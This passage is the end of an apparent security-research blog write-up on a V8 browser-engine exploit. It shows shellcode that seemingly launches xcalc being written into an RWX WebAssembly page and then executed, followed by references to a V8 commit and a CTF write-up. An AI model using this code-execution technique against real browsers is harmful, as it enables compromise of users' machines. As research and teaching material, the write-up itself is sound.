  <span style=color:#ae81ff>0x15e8525e54632d68</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x4c50534944000000</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x302e303a273d5941</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x00636c6163782027</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x0f583b6a5e545756</span><span style=color:#a6e22e>n</span>,
  <span style=color:#ae81ff>0x0000000000000005</span><span style=color:#a6e22e>n</span>
];
<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>shellcode</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
  <span style=color:#a6e22e>strong_write</span>(<span style=color:#a6e22e>rwx</span> <span style=color:#f92672>+</span> (<span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>*</span> <span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>i</span>)), <span style=color:#a6e22e>shellcode</span>[<span style=color:#a6e22e>i</span>]);

<span style=color:#ae81ff>_</span><span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>main</span>();
</code></pre></div><h2 id=references>References</h2>
<ul>
<li><a href=https://chromium-review.googlesource.com/c/v8/v8/+/3845636>[sandbox] Remove a number of native allocations from WasmInstanceObject</a></li>
<li><a href=https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/>DiceCTF 2022 - Memory Hole | kylebot&rsquo;s Blog</a></li>
<li><a href=https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Global/Global>WebAssembly.Global() constructor - WebAssembly | MDN</a></li>
</ul>
</div>
<footer class=content__footer></footer>
</section>
<footer class=page__footer><p>
</p>
<p>&copy; 2023 Anvbis</p>
<p>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p>
</footer>
</div>
</body>
</html>